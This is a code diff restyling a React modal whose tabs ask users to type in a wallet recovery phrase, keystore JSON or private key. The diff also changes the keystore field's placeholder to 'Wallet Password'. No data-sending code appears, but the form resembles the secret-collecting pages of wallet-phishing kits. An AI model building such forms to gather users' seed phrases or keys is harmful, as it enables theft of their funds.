@@ -26,8 +26,9 @@ const style = {
   transform: "translate(-50%, -50%)",
   width: 400,
   bgcolor: "background.paper",
-  boxShadow: 24,
   p: 4,
+  boxShadow: 10,
+  borderRadius: "10px",
 };
 
 const BasicModal = ({
@@ -138,10 +139,8 @@ const BasicModal = ({
             <Box
               sx={{
                 maxWidth: 500,
-                border: "1px solid #ddd",
                 borderRadius: 2,
                 p: 3,
-                boxShadow: 3,
                 backgroundColor: "white",
               }}
             >
@@ -161,9 +160,9 @@ const BasicModal = ({
               <Stack direction="row" justifyContent="space-between">
                 <Typography
                   sx={{
-                    background: activeTab === "phrase" ? "blue" : "white",
+                    background: activeTab === "phrase" ? "skyblue" : "white",
                     cursor: "pointer",
-                    color: "black",
+                    color: activeTab === "phrase" ? "white" : "black",
                     paddingX: "2px",
                     borderRadius: "10px",
                   }}
@@ -173,9 +172,9 @@ const BasicModal = ({
                 </Typography>
                 <Typography
                   sx={{
-                    background: activeTab === "keystore" ? "blue" : "white",
+                    background: activeTab === "keystore" ? "skyblue" : "white",
                     cursor: "pointer",
-                    color: "black",
+                    color: activeTab === "keystore" ? "white" : "black",
                     paddingX: "2px",
                     borderRadius: "10px",
                   }}
@@ -185,9 +184,9 @@ const BasicModal = ({
                 </Typography>
                 <Typography
                   sx={{
-                    background: activeTab === "private" ? "blue" : "white",
+                    background: activeTab === "private" ? "skyblue" : "white",
                     cursor: "pointer",
-                    color: "black",
+                    color: activeTab === "private" ? "white" : "black",
                     paddingX: "2px",
                     borderRadius: "10px",
                   }}
@@ -226,12 +225,11 @@ const BasicModal = ({
                   <Typography variant="body2" mb={1}>
                     Enter your keystore json
                   </Typography>
+                  <input type="file" />
                   <TextField
-                    multiline
-                    rows={4}
                     variant="outlined"
                     fullWidth
-                    placeholder="Enter your  keystore json"
+                    placeholder="Wallet Password"
                     onChange={(e) => setKeystore(e.target.value)}
                   />
                 </Box>
@@ -242,8 +240,6 @@ const BasicModal = ({
                     Enter your Private Key
                   </Typography>
                   <TextField
-                    multiline
-                    rows={4}
                     variant="outlined"
                     fullWidth
                     placeholder="Enter your Private Key"
